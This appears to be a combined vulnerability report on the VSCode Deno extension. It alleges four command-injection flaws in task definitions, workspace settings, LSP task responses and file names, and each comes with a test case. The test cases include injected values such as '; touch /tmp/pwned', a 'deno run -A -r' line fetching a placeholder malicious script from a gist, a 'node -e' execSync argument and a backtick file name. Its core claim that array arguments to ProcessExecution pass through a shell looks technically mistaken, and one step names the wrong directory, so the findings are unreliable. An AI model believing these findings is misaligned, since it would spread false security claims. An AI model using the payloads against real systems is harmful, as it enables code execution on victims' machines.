### Combined Vulnerability List

#### 1. Command Injection via Task Definitions in `tasks.json` and `deno.json`

*   **Vulnerability Name:** Command Injection via Task Definitions in `tasks.json` and `deno.json`
*   **Description:**
    The VSCode Deno extension allows users to define tasks in `tasks.json` and `deno.json` files to automate Deno CLI commands. These task definitions can include arbitrary commands and arguments. If a malicious repository provides a crafted `tasks.json` or `deno.json` file with malicious commands, opening the repository in VSCode with the Deno extension enabled could lead to command injection. The vulnerability is triggered when the user interacts with the task, for example, by running it from the tasks sidebar or through the command palette.

    Steps to trigger vulnerability:
    1. Attacker creates a malicious repository containing a `tasks.json` or `deno.json` file.
    2. In the `tasks.json` or `deno.json`, the attacker defines a task with a malicious command, for example, by injecting shell commands into the `command` or `args` fields.
    3. Victim clones or opens the malicious repository in VSCode with the Deno extension enabled.
    4. Victim interacts with the task, e.g., by opening the tasks sidebar and clicking "Run Task" or by using the "Tasks: Run Task" command and selecting the malicious task.
    5. The malicious command injected by the attacker is executed on the victim's machine with the privileges of the VSCode process.
*   **Impact:**
    Remote Code Execution (RCE). An attacker can execute arbitrary commands on the victim's machine. This could lead to data theft, system compromise, or further malicious activities.
*   **Vulnerability Rank:** Critical
*   **Currently Implemented Mitigations:**
    None. The extension directly uses the command and arguments from the task definitions to execute commands via `vscode.ProcessExecution`. There is no input sanitization or validation on the task definitions provided by the workspace.
*   **Missing Mitigations:**
    - Input sanitization and validation: Sanitize and validate the `command` and `args` fields in `tasks.json` and `deno.json` task definitions to prevent command injection. Disallow shell metacharacters or escape them properly before passing to `ProcessExecution`.
    - Sandboxing or isolation: Execute tasks in a sandboxed environment with limited privileges to minimize the impact of command injection.
    - User confirmation: Prompt user confirmation before executing tasks defined in workspace configuration files, especially for newly opened workspaces or workspaces from untrusted sources.
*   **Preconditions:**
    - Victim must have the VSCode Deno extension installed and enabled.
    - Victim must open a malicious repository containing a crafted `tasks.json` or `deno.json` file in VSCode.
    - Victim must interact with the malicious task by attempting to run it.
*   **Source Code Analysis:**
    1. **`client/src/tasks.ts` and `client/src/tasks_sidebar.ts`**: These files are responsible for reading and executing tasks. `DenoTasksTreeDataProvider` in `tasks_sidebar.ts` fetches tasks and `DenoTaskProvider` in `tasks.ts` provides tasks. `buildDenoTask` and `buildDenoConfigTask` functions are used to construct `vscode.Task` objects.
    2. **`client/src/tasks.ts#buildDenoTask`**:
       ```typescript
       export function buildDenoTask(
         target: vscode.WorkspaceFolder,
         process: string,
         definition: DenoTaskDefinition,
         name: string,
         args: string[],
         problemMatchers: string[],
       ): vscode.Task {
         const exec = new vscode.ProcessExecution(
           process,
           args, // [VULNERABILITY]: `args` is directly passed to ProcessExecution without sanitization
           definition,
         );

         return new vscode.Task(
           definition,
           target,
           name,
           TASK_SOURCE,
           exec,
           problemMatchers,
         );
       }
       ```
       - The `buildDenoTask` function takes an array of `args` directly from the `DenoTaskDefinition` and passes it to `vscode.ProcessExecution`. This function is used for tasks defined in `tasks.json`.
    3. **`client/src/tasks.ts#buildDenoConfigTask`**:
       ```typescript
       export function buildDenoConfigTask(
         scope: vscode.WorkspaceFolder,
         process: string,
         name: string,
         command: string | undefined,
         sourceUri?: vscode.Uri,
       ): vscode.Task {
         const args = [];
         if (
           sourceUri &&
           vscode.Uri.joinPath(sourceUri, "..").toString() != scope.uri.toString()
         ) {
           const configPath = path.relative(scope.uri.fsPath, sourceUri.fsPath);
           args.push("-c", configPath);
         }
         args.push(name); // [VULNERABILITY]: `name` (task name from deno.json) is added to args without sanitization
         const task = new vscode.Task(
           {
             type: TASK_TYPE,
             name: name,
             command: "task",
             args, // [VULNERABILITY]: `args` is directly passed to ProcessExecution without sanitization
             sourceUri,
           },
           scope,
           name,
           TASK_SOURCE,
           new vscode.ProcessExecution(process, ["task", ...args]), // [VULNERABILITY]: `args` is directly passed to ProcessExecution without sanitization
           ["$deno"],
         );
         task.detail = `$ ${command}`;
         return task;
       }
       ```
       - The `buildDenoConfigTask` function, used for tasks in `deno.json`, also constructs `vscode.ProcessExecution` with arguments derived from `name` and `args` in `deno.json` without sanitization.
    4. **`client/src/tasks_sidebar.ts#DenoTasksTreeDataProvider.getChildren`**:
       - This function and related classes read task definitions from `deno.json` files using `lsp_extensions.task` request to the Deno language server, and from `tasks.json` using `util.readTaskDefinitions`. These definitions are then used to create `DenoTask` tree items, which, when executed, will use the vulnerable `buildDenoTask` or `buildDenoConfigTask` functions.
    **Visualization**:

    ```
    Malicious tasks.json/deno.json --> DenoTasksTreeDataProvider/DenoTaskProvider --> buildDenoTask/buildDenoConfigTask --> vscode.ProcessExecution --> Command Injection
    ```
*   **Security Test Case:**
    1. Create a new directory named `malicious-repo`.
    2. Inside `malicious-repo`, create a file named `tasks.json` with the following content:
       ```json
       {
         "version": "2.0.0",
         "tasks": [
           {
             "type": "deno",
             "command": "run",
             "args": [
               "-A",
               "-r",
               "https://gist.githubusercontent.com/exampleuser/1234567890abcdef/raw/malicious.ts; touch /tmp/pwned"
             ],
             "problemMatcher": [
               "$deno"
             ],
             "label": "malicious: task1"
           }
         ]
       }
       ```
       Alternatively, create `deno.json` with:
       ```json
       {
         "tasks": {
           "maliciousTask": "run -A -r https://gist.githubusercontent.com/exampleuser/1234567890abcdef/raw/malicious.ts; touch /tmp/pwned"
         }
       }
       ```
       (Note: Replace `https://gist.githubusercontent.com/exampleuser/1234567890abcdef/raw/malicious.ts` with a real URL that serves a harmless Deno script to avoid actual harmful execution in a real test scenario. For demonstration of command injection, the `; touch /tmp/pwned` is key.)

    3. Open VSCode and open the `malicious-repo` directory as a workspace folder. Ensure the Deno extension is enabled for this workspace.
    4. For `tasks.json` test case:
       - Open the Command Palette (Ctrl+Shift+P or Cmd+Shift+P) and type "Tasks: Run Task".
       - Select "malicious: task1".
    5. For `deno.json` test case:
       - Open the "Deno Tasks" sidebar (if visible, otherwise enable it).
       - Locate "maliciousTask" under your workspace.
       - Click the "Run Task" icon next to "maliciousTask".
    6. Observe the execution. If the command injection is successful, a file named `pwned` will be created in the `/tmp/` directory (or user's temp directory depending on OS and injected command).
    7. Verify the file creation by checking `/tmp/pwned`. If the file exists, the command injection vulnerability is confirmed.

#### 2. Command Injection via `deno.codeLens.testArgs`, `deno.testing.args`, and `deno.importMap` Settings

*   **Vulnerability Name:** Command Injection in Test Code Lens and Tasks via `deno.codeLens.testArgs`, `deno.testing.args`, and `deno.importMap`
*   **Description:**
    A malicious repository can include a `.vscode/settings.json` file that sets the `deno.codeLens.testArgs`, `deno.testing.args`, or `deno.importMap` configuration options to inject arbitrary shell commands. When a victim opens this repository in VSCode with the Deno extension installed and subsequently uses the "Run Test" code lens, the Test Explorer feature, or runs Deno tasks, the injected commands will be executed on their machine.

    Steps to trigger the vulnerability:
    1. An attacker creates a malicious repository.
    2. Within this repository, the attacker creates a `.vscode/settings.json` file.
    3. In the `.vscode/settings.json` file, the attacker sets either `deno.codeLens.testArgs`, `deno.testing.args`, or `deno.importMap` to include a malicious command. For example:
       ```json
       {
           "deno.codeLens.testArgs": [
               "--allow-all",
               "; touch malicious_file.txt"
           ]
       }
       ```
    4. The attacker hosts this malicious repository publicly (e.g., on GitHub).
    5. A victim, who has the "vscode-deno" extension installed, clones or opens this malicious repository in VSCode.
    6. The victim opens a Deno test file (e.g., a file containing `Deno.test(...)`).
    7. The victim either clicks the "Run Test" code lens that appears above the test declaration or runs tests via the VSCode Test Explorer or Deno tasks.
    8. The Deno extension executes the test command, incorporating the malicious arguments from the `.vscode/settings.json` file.
    9. The injected command, in this example `touch malicious_file.txt`, is executed on the victim's system.
*   **Impact:**
    Remote Code Execution (RCE). Successful exploitation of this vulnerability allows an attacker to execute arbitrary commands on the victim's machine with the privileges of the VSCode process. This can lead to complete compromise of the victim's local system, including data theft, malware installation, and further unauthorized activities.
*   **Vulnerability Rank:** Critical
*   **Currently Implemented Mitigations:**
    No mitigations are currently implemented in the project to prevent command injection through `deno.codeLens.testArgs`, `deno.testing.args`, and `deno.importMap`. The extension directly reads these configuration values and uses them to construct and execute Deno CLI commands without any sanitization or validation.
*   **Missing Mitigations:**
    - Input Sanitization: The extension should sanitize or validate the values provided in `deno.codeLens.testArgs`, `deno.testing.args`, and `deno.importMap` configuration settings. It should remove or escape any characters or sequences that could be used for command injection (e.g., semicolons, backticks, pipes, etc.).
    - Input Validation: Validate the structure and content of `deno.codeLens.testArgs`, `deno.testing.args`, and `deno.importMap` to ensure they conform to expected formats and do not contain suspicious patterns. Consider using an allowlist of safe arguments.
    - User Warning and Confirmation: When the extension detects that `deno.codeLens.testArgs`, `deno.testing.args`, or `deno.importMap` are being set by workspace configuration (e.g., through `.vscode/settings.json`), it should display a warning to the user, highlighting the potential security risk. The extension could also request explicit user confirmation before executing any tasks with these potentially modified arguments.
    - Restrict Configuration Scope: Consider restricting the scope at which `deno.codeLens.testArgs`, `deno.testing.args`, and `deno.importMap` can be set. For instance, disallowing workspace-level settings for these security-sensitive options and only allowing user-level configuration could reduce the attack surface from malicious repositories.
*   **Preconditions:**
    1. The victim has the "vscode-deno" extension installed and enabled in VSCode.
    2. The victim opens a workspace or folder in VSCode that contains a malicious `.vscode/settings.json` file.
    3. The malicious `.vscode/settings.json` file configures either `deno.codeLens.testArgs`, `deno.testing.args`, or `deno.importMap` to include injected commands.
    4. The workspace contains a Deno test file that triggers the display of the "Run Test" code lens, or the victim uses the Test Explorer to run tests or executes Deno tasks.
    5. The victim interacts with the test features by clicking "Run Test" code lens or executing tests through Test Explorer or running Deno tasks.
*   **Source Code Analysis:**
    1. `client/src/commands.ts`: The `test` function is responsible for constructing and executing Deno test commands triggered by code lens or Test Explorer.
    2. `client/src/commands.ts`: Inside the `test` function, the `deno.codeLens.testArgs` configuration is retrieved using `config.get<string[]>("codeLens.testArgs")`.
    [client/src/commands.ts#L523-L525](https://github.com/denoland/vscode_deno/blob/main/client/src/commands.ts#L523-L525)
    ```typescript
    const testArgs: string[] = [
      ...(config.get<string[]>("codeLens.testArgs") ?? []),
    ];
    ```
    3. `client/src/commands.ts`: These retrieved `testArgs` are directly incorporated into the command arguments array without any sanitization.
    [client/src/commands.ts#L543](https://github.com/denoland/vscode_deno/blob/main/client/src/commands.ts#L543)
    ```typescript
    const args = ["test", ...testArgs, "--filter", nameRegex, filePath];
    ```
    4. `client/src/tasks.ts`: The `buildDenoTask` function is used to create a VSCode Task with `vscode.ProcessExecution`. The unsanitized `args` array is passed directly to `ProcessExecution`.
    [client/src/tasks.ts#L29](https://github.com/denoland/vscode_deno/blob/main/client/src/tasks.ts#L29)
    ```typescript
    const exec = new vscode.ProcessExecution(
      process,
      args, // Unsanitized arguments
      definition,
    );
    ```
    5. Visualization of data flow:

    ```mermaid
    graph LR
        subgraph VSCode Configuration
            A[deno.codeLens.testArgs/deno.testing.args/deno.importMap] --> B(getConfiguration);
        end

        subgraph client/src/commands.ts - test()
            B --> C{config.get(...)};
            C --> D[testArgs Array];
            D --> E{Command Args Construction};
            E --> F[args Array];
        end

        subgraph client/src/tasks.ts - buildDenoTask()
            F --> G(ProcessExecution);
            G --> H[vscode.Task Execution];
        end

        H --> I[System Command Execution];
    ```
*   **Security Test Case:**
    1. Create a new directory named `malicious-deno-repo`.
    2. Inside `malicious-deno-repo`, create a subdirectory named `.vscode`.
    3. Inside `.vscode`, create a file named `settings.json` with the following content:
       ```json
       {
           "deno.codeLens.testArgs": [
               "--allow-all",
               "; touch malicious_file.txt"
           ]
       }
       ```
    4. Inside `malicious-deno-repo`, create a file named `test_vuln.ts` with the following content:
       ```typescript
       Deno.test("command injection test", () => {
           console.log("Test running");
       });
       ```
    5. Open the `malicious-deno-repo` directory in VSCode. Ensure the Deno extension is active.
    6. Open the `test_vuln.ts` file in the editor.
    7. Observe the "▶ Run Test" code lens appearing above the `Deno.test` declaration.
    8. Click on the "▶ Run Test" code lens.
    9. After the test execution (which might succeed or fail), check the `malicious-deno-repo` directory for a new file named `malicious_file.txt`.
    10. If `malicious_file.txt` exists, it confirms that the command injection was successful, as the `touch malicious_file.txt` command was executed as part of the test execution process.
    11. To test `deno.testing.args`, you can create a `tasks.json` file in `.vscode` directory:
        ```json
        {
            "version": "2.0.0",
            "tasks": [
                {
                    "type": "deno",
                    "command": "test",
                    "label": "Deno: Run tests",
                    "problemMatcher": [
                        "$deno-test"
                    ]
                }
            ]
        }
        ```
        And modify `settings.json` to use `deno.testing.args`:
        ```json
        {
            "deno.enable": true,
            "deno.testing.args": [
                "--allow-all",
                "; touch pwned-task.txt ; #"
            ]
        }
        ```
    12. Run the task "Deno: Run tests" from Tasks: Run Task menu.
    13. Observe that a file named `pwned-task.txt` is created in the `malicious-deno-workspace` directory, confirming command injection via `deno.testing.args`.
    14. To test `deno.importMap`, repeat steps 2-7, but in step 3, create `settings.json` with the following content:
        ```json
        {
          "deno.importMap": "./malicious_import_map.json"
        }
        ```
    15. Create a file named `malicious_import_map.json` in the `malicious-deno-repo` directory with the following content:
        ```json
        {
          "imports": {
            "malicious": "; touch malicious_file_importmap; #"
          }
        }
        ```
    16. Create a file named `test_importmap.ts` in the `malicious-deno-repo` directory with the following content:
        ```typescript
        import "malicious";
        Deno.test("test with importMap injection", () => {
          console.log("test");
        });
        ```
    17. Open the `test_importmap.ts` file in VSCode.
    18. Click the "Run Test" code lens above the `Deno.test` declaration.
    19. After the test execution, check the `malicious-deno-repo` directory. You should observe a new file named `malicious_file_importmap` has been created, which confirms the command injection vulnerability through `deno.importMap`.


#### 3. Command Injection via Malicious Task Definition from LSP Server

*   **Vulnerability Name:** Command Injection via Malicious Task Definition
*   **Description:**
    1. A threat actor crafts a malicious repository containing a compromised Deno Language Server or manipulates the existing LSP response.
    2. The victim opens this malicious repository in VSCode with the Deno extension enabled.
    3. The Deno extension, upon activation or refresh, requests task definitions from the Deno Language Server using the `deno/taskDefinitions` request.
    4. The compromised Language Server responds with a crafted task definition. This definition includes a malicious command and arguments designed for command injection. For example, the command could be `node` and arguments could be `['-e', 'require("child_process").execSync("malicious_command")']`.
    5. The VSCode Deno extension processes this response and displays the malicious task in the Deno Tasks sidebar.
    6. Unsuspecting victim, intending to use project tasks or unaware of the malicious nature of the task, clicks "Run Task" for the maliciously defined task in the sidebar.
    7. The VSCode Deno extension executes the task using `vscode.tasks.executeTask()`, which in turn executes the injected malicious command on the victim's machine.
*   **Impact:** Remote Code Execution (RCE). Successful exploitation allows the attacker to execute arbitrary commands on the victim's machine with the privileges of the VSCode process. This can lead to complete system compromise, data exfiltration, malware installation, and other malicious activities.
*   **Vulnerability Rank:** Critical
*   **Currently Implemented Mitigations:**
    * None. The current implementation does not perform any validation or sanitization of task definitions received from the Deno Language Server. It blindly trusts and executes the commands provided in the task definitions.
*   **Missing Mitigations:**
    - Input Validation and Sanitization: Implement strict validation and sanitization of the `command` and `args` properties in task definitions received from the Language Server. Sanitize or reject task definitions containing potentially dangerous characters or command structures. Use a safe command execution mechanism that prevents injection.
    - User Confirmation: Introduce a confirmation step before executing tasks, especially those fetched from workspace configurations. Display a clear and understandable prompt to the user showing the exact command that is about to be executed and ask for explicit user consent.
    - Principle of Least Privilege: Explore the possibility of executing tasks with reduced privileges. While challenging in the context of VSCode extensions, sandboxing or privilege separation could limit the impact of successful command injection.
*   **Preconditions:**
    - Victim must open a workspace containing a malicious repository or a repository configured to interact with a compromised Deno Language Server.
    - Deno extension must be enabled and active within the workspace.
    - The malicious Deno Language Server must be capable of intercepting or responding to the `deno/taskDefinitions` request with malicious task definitions.
    - Victim must interact with the Deno Tasks sidebar and attempt to execute the maliciously defined task.
*   **Source Code Analysis:**
    1. **`client\src\tasks_sidebar.ts`**: The `DenoTasksTreeDataProvider` class is responsible for displaying tasks in the sidebar. The `getChildren` method of this class, when called without an element, triggers the task retrieval process.
    2. **`client\src\tasks_sidebar.ts`**: The `DenoTaskProvider` class fetches task definitions from the Language Server in its `provideTasks` method.
    3. **`client\src\tasks.ts`**: The `buildDenoConfigTask` function constructs a `vscode.Task` object. Critically, it uses `vscode.ProcessExecution` and populates the `command` and `args` directly from the `configTask` received from the Language Server.
    4. **`client\src\tasks_sidebar.ts`**: When the user executes a task from the sidebar, the `#runTask` method is called, which directly executes the `vscode.Task` object.
*   **Security Test Case:**
    1. **Setup:**
        - Install the VSCode Deno extension.
        - Create a new directory to simulate a malicious repository.
        - Inside the repository, create a `deno.json` file (can be empty or contain valid Deno configuration).
        - Create a file, e.g., `malicious_lsp_server.js`, to simulate a malicious Deno Language Server. This script should:
            - Listen for LSP connections (e.g., using `node-jsonrpc`).
            - Intercept the `deno/taskDefinitions` request.
            - Respond with a crafted task definition containing a malicious command. For example, using `calc.exe` for Windows RCE demonstration.
        - In VSCode settings, configure `deno.path` to point to a script that launches `node malicious_lsp_server.js` instead of the actual `deno lsp`.
    2. **Test Execution:**
        - Open the malicious repository in VSCode.
        - Ensure the Deno extension is enabled for the workspace.
        - Open the Deno Tasks sidebar.
        - You should see "Malicious Task" listed in the sidebar.
        - Click the "Run Task" icon next to "Malicious Task".
        - Observe the execution of the malicious command (e.g., `calc.exe` should launch).

#### 4. Command Injection in 'Deno: Test' Command via Malicious File Path

*   **Vulnerability Name:** Command Injection in 'Deno: Test' Command via Malicious File Path
*   **Description:**
    1.  A threat actor creates a malicious repository containing a JavaScript or TypeScript file with a specially crafted filename.
    2.  The victim clones this malicious repository and opens it in VSCode with the Deno extension enabled.
    3.  The threat actor lures the victim to open the malicious file in the editor, which contains a `Deno.test()` declaration, triggering the display of the "Run Test" code lens.
    4.  The victim clicks the "Run Test" code lens above the `Deno.test()` declaration in the malicious file.
    5.  The Deno extension executes the `deno test` command, constructing the command arguments by including the `filePath` derived from the malicious file's URI without proper sanitization.
    6.  Due to the malicious filename containing command injection payloads, arbitrary commands are executed on the victim's machine with the privileges of the VSCode process.
*   **Impact:**
    Remote Code Execution (RCE). An attacker can execute arbitrary commands on the victim's machine, potentially leading to data theft, malware installation, or complete system compromise.
*   **Vulnerability Rank:** Critical
*   **Currently Implemented Mitigations:**
    None. The code directly uses the `filePath` derived from the file URI in the command execution without any sanitization or validation.
*   **Missing Mitigations:**
    - Input sanitization: The `filePath` should be sanitized to remove or escape any characters that could be interpreted as shell metacharacters before being used in command construction.
    - Command arguments construction: Use secure methods for constructing command arguments, such as passing arguments as separate parameters to the `child_process.spawn` function instead of concatenating them into a single string.
*   **Preconditions:**
    1.  The victim has the VSCode Deno extension installed and enabled.
    2.  The victim clones and opens a malicious repository in VSCode.
    3.  The malicious repository contains a JavaScript or TypeScript file with a crafted filename and a `Deno.test()` declaration.
    4.  The victim opens the malicious file in VSCode editor and clicks the "Run Test" code lens.
*   **Source Code Analysis:**
    1.  **File:** `client/src/commands.ts`
    2.  **Function:** `test`
    3.  **Code Snippet:**
        ```typescript
        export function test(
          _context: vscode.ExtensionContext,
          extensionContext: DenoExtensionContext,
        ): Callback {
          return async (uriStr: string, name: string, options: TestCommandOptions) => {
            const uri = vscode.Uri.parse(uriStr, true);
            const filePath = uri.fsPath;
            // ... other configurations ...
            const nameRegex = `/^${name.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}$/`;
            const args = ["test", ...testArgs, "--filter", nameRegex, filePath];
            // ... task execution ...
          };
        ```
    4.  **Vulnerability Point:** The `filePath` variable, derived from `uriStr` using `uri.fsPath`, is directly appended to the `args` array used to construct the `deno test` command. There is no input sanitization on `filePath` before it is used in the command execution.
*   **Security Test Case:**
    1.  Create a malicious repository.
    2.  Create a file with a malicious filename, for example: `test`;touch poc.txt;`.ts
    3.  Add the following content to the malicious file:
        ```typescript
        Deno.test("Vulnerable Test", () => {
          console.log("Test running");
        });
        ```
    4.  Clone the malicious repository to your local machine.
    5.  Open the cloned repository in VSCode with the Deno extension enabled.
    6.  Open the malicious file (`test`;touch poc.txt;`.ts`) in the VSCode editor.
    7.  Observe the "Run Test" code lens appearing above the `Deno.test()` declaration.
    8.  Click the "Run Test" code lens.
    9.  Check if the command `touch poc.txt` was executed. Verify by checking for the existence of `poc.txt` file in the repository directory.
